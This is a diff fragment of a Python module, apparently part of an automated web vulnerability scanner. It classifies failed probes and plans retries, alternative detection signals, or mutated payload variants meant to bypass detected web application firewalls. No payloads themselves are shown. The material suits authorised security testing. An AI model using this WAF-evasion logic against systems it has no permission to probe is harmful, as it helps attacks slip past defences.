+        # signal didn't match → try alternative signal
+        return "false_negative"
+    return "transient"
+
+
+def build_adaptive_plan(
+    probe: dict,
+    result: dict,
+    vuln_type: str,
+    original_payload: str,
+    attempt: int = 1,
+    max_retries: int = 3,
+) -> dict:
+    """Build the adaptive plan for a failed or blocked probe.
+
+    Args:
+        probe: the original probe description (type, target, signal).
+        result: the HTTP result from the initial attempt.
+        vuln_type: the vulnerability type being probed (for mutation strategies).
+        original_payload: the payload that was sent.
+        attempt: current attempt number (1 = first failure).
+        max_retries: maximum retry attempts before aborting.
+
+    Returns:
+        Adaptive plan dict matching AdaptivePlan dataclass fields.
+    """
+    failure = classify_failure(result)
+    waf_detected, waf_type = detect_waf(result)
+
+    plan = AdaptivePlan(action="abort", reason=f"unclassified failure: {failure}")
+    plan.waf_detected = waf_detected
+    plan.waf_type = waf_type
+    plan.max_retries = max_retries
+
+    if failure == "transient" and attempt < max_retries:
+        plan.action = "retry"
+        plan.reason = f"transient error ({result.get('error', 'unknown')}); exponential backoff"
+        plan.retry_schedule = build_retry_schedule(max_retries - attempt + 1)
+        plan.fallback_strategy = None
+
+    elif failure == "waf_blocked":
+        mutations = generate_mutations(vuln_type, original_payload, max_variants=5)
+        if mutations:
+            plan.action = "mutate"
+            plan.reason = f"WAF detected ({waf_type}); trying {len(mutations)} mutated payload variants"
+            plan.mutated_payloads = mutations
+            plan.fallback_strategy = "waf_bypass_encoding"
+        else:
+            plan.action = "fallback_signal"
+            plan.reason = f"WAF detected ({waf_type}); no mutations available, trying alternative signal"
+            plan.alternative_signals = ALTERNATIVE_SIGNALS.get(vuln_type, [])
+
+    elif failure == "false_negative":
+        alt_signals = ALTERNATIVE_SIGNALS.get(vuln_type, [])
+        if alt_signals:
+            plan.action = "fallback_signal"
+            plan.reason = "200 response but primary signal not matched; trying alternative probe strategies"
+            plan.alternative_signals = alt_signals
+            plan.fallback_strategy = "secondary_signal"
+        else:
+            plan.action = "abort"
+            plan.reason = "false negative; no alternative signals available for this type"
+
+    elif failure == "server_error" and attempt < 2:
+        plan.action = "retry"
+        plan.reason = f"server error ({result.get('status_code')}); single retry"
+        plan.retry_schedule = build_retry_schedule(1)
+
+    elif failure == "auth_required":
+        plan.action = "abort"
+        plan.reason = "endpoint requires authentication; no credentials provided"
+        plan.fallback_strategy = "needs_credentials"
+
+    elif failure == "not_found":
+        plan.action = "abort"
+        plan.reason = "endpoint not found (404/410); skipping"
+        plan.fallback_strategy = "endpoint_gone"
+
+    return {
+        "action": plan.action,
+        "reason": plan.reason,
+        "waf_detected": plan.waf_detected,
+        "waf_type": plan.waf_type,
+        "retry_schedule": plan.retry_schedule,
+        "mutated_payloads": plan.mutated_payloads,
+        "alternative_signals": plan.alternative_signals,
+        "fallback_strategy": plan.fallback_strategy,
+        "max_retries": plan.max_retries,
+        "attempt": attempt,
+        "failure_type": failure,
+    }
+
+
+def main() -> int:
+    ap = argparse.ArgumentParser(description="Adaptive engine: retry/mutation/WAF-fallback planner")
+    ap.add_argument("--probe", required=True, help="Original probe JSON (path or '-')")
+    ap.add_argument("--result", required=True, help="HTTP result JSON (path or '-')")
+    ap.add_argument("--vuln-type", required=True, help="Vulnerability type for mutation strategies")
+    ap.add_argument("--payload", default="", help="Original payload that was sent")
+    ap.add_argument("--attempt", type=int, default=1, help="Current attempt number")
+    ap.add_argument("--max-retries", type=int, default=3)
+    args = ap.parse_args()
+
+    probe = load_json(args.probe)
+    result = load_json(args.result)
+    plan = build_adaptive_plan(
+        probe, result, args.vuln_type, args.payload, args.attempt, args.max_retries
+    )
+    print(dump_json(plan))
+    return 0 if plan["action"] != "abort" else 1
+
+
+if __name__ == "__main__":
+    sys.exit(main())
